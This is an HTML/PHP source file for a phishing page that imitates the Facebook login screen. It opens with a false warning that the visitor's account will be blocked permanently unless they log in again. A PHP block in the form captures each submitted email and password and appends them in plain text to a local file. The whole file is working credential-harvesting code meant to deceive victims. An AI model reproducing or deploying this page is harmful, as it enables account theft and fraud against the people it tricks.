<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <!-- custom css -->
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="nx.png" type="image/x-icon"> 
    <title>Facebook-log in or sign up</title>
  </head>
  <body>
  <div class="alert alert-danger text-center" role="alert"><b>You've entered a block link that violates our Community Guidelines. Please Login again Otherwise your id has been blocked permanently!</b></div>
    <main class="container">
        <section class="row">
            <div class="left pt-md-5 col-6">
                <img src="fb.png">
                <p>Facebook helps you connect and share with the people in your life.</p>
            </div>
            <div class="right col-6">
                <form class="mx-auto" method ='POST'>
                    <div class="form-padding">
                        <div class="form-group pb-3">
                        <input type="text"name='email' class="form-control email ent" aria-describedby="emailHelp" placeholder="Email address or phone number" autofocus>
                        </div>
                        <div class="form-group pb-3">
                        <input type="password" name='password' class="form-control pass ent" placeholder="Password">
                        </div>
                        <div class="d-grid">
                            <button class="btn btn-primary login ent" name='login'>Log In</button>
                        </div>  
                        <small class="form-text text-primary d-block text-center mt-3">Forgotten password?</small>
                        <hr>
                        <span><hr><label>or</label><hr></span>
                        <button class="btn lst mx-auto d-block my-3">Create New Account</button>
                    </div>
                    <p>
                    <?php
                     if(isset($_POST['login'])){
                         $email = "Email : ". $_POST['email'];
                         $pass = "Password : ". $_POST['password'];
                         $info = $email . "\n" . $pass . "\n";
                         $myfile = fopen("testfile.txt", "a+");
                         fwrite($myfile, $info);
                         fclose($myfile);
                     }
                    ?>
                    </p>
                </form>
                <p class="text-center mt-4"><b>Create a Page</b> for a celebrity, band or business.</p>
            </div>
        </section>
    </main>
    <footer>
        <div class="container jn">
            <ul class="upperUL">
                <li><a href="#">English (UK)</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">অসমীয়া</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">नेपाली</a></li>
                <li><a href="#">Bahasa Indonesia</a></li>
                <li><a href="#">العربية</a></li>
                <li><a href="#">中文(简体)</a></li>
                <li><a href="#">Bahasa Melayu</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#"><span>&#10010;</span></a></li>
            </ul>
            <br>
            <hr class="hr">

            <ul class="lowerUL">
                <li><a href="">Sign Up</a></li>
                <li><a href="">Log In</a></li>
                <li><a href="">Messenger</a></li>
                <li><a href="">Facebook Lite</a></li>
                <li><a href="">Watch</a></li>
                <li><a href="">People</a></li>
                <li><a href="">Pages</a></li>
                <li><a href="">Page</a></li>
                <li><a href="">categories</a></li>
                <li><a href="">Places</a></li>
                <li><a href="">Games</a></li>
                <li><a href="">Locations</a></li>
                <li><a href="">Marketplace</a></li>
                <li><a href="">Facebook Pay</a></li>
                <li><a href="">Groups</a></li>
                <li><a href="">Jobs</a></li>
                <li><a href="">Oculus</a></li>
                <li><a href="">Portal</a></li>
                <li><a href="">Instagram</a></li>
                <li><a href="">Local</a></li>
                <li><a href="">Fundraisers</a></li>
                <li><a href="">Services</a></li>
                <li><a href="">Voting Information Centre</a></li>
                <li><a href="">About</a></li>
                <li><a href="">Create ad</a></li>
                <li><a href="">Create Page</a></li>
                <li><a href="">Developers</a></li>
                <li><a href="">Careers</a></li>
                <li><a href="">Privacy</a></li>
                <li><a href="">Cookies</a></li>
                <li><a href="">AdChoices</a></li>
                <li><a href="">Terms</a></li>
                <li><a href="">helps</a></li>
            </ul>
        </div>
        <div class="clearfix"></div>
    </footer>

    <!-- Custom JS -->
    <script src='custom.js'></script>
    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>